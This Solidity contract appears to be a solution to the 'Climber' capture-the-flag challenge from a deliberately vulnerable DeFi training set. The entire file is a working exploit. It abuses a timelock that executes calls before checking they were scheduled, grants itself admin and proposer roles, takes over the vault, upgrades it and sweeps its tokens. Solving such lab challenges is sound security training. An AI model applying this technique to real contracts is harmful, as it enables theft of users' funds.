// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

interface TargetVault {
  function upgradeTo(address) external;
  function sweepFunds(address,address) external;
}

contract AttackerClimber {
  address payable immutable owner;

  ClimberTimelock public immutable timelockTarget;

  DamnValuableToken public immutable token;

  address immutable targetVault;

  address immutable attackedVault;

  address[] private targets;

  uint256[] private values;

  bytes32 salt = "0x1234";

  bytes[] private dataElements;

  constructor(address dvtAddress, address _timelockTarget, address _targetVault, address _attackedVault) {
    token = DamnValuableToken(dvtAddress);
    timelockTarget = ClimberTimelock(payable(_timelockTarget));
    targetVault = _targetVault;
    attackedVault = _attackedVault;

    owner = payable(msg.sender);

    targets.push(_timelockTarget);
    targets.push(_timelockTarget);
    targets.push(address(this));
    targets.push(_targetVault);

    values.push(0);
    values.push(0);
    values.push(0);
    values.push(0);

    dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
    dataElements.push(
      abi.encodeWithSignature(
        "grantRole(bytes32,address)",
        keccak256("ADMIN_ROLE"),
        address(this)
      )
    );
    dataElements.push(abi.encodeWithSignature("scheduleMe()"));
    dataElements.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));

  }

  function attackTimelock() external {
    timelockTarget.execute(targets, values, dataElements, salt);
  }

  function scheduleMe() external {
    timelockTarget.grantRole(keccak256("PROPOSER_ROLE"), address(this));
    timelockTarget.schedule(targets, values, dataElements, salt);
  }

  function attackVault() external {
    TargetVault(targetVault).upgradeTo(attackedVault);
    TargetVault(targetVault).sweepFunds(address(token),owner);
    
  }

}
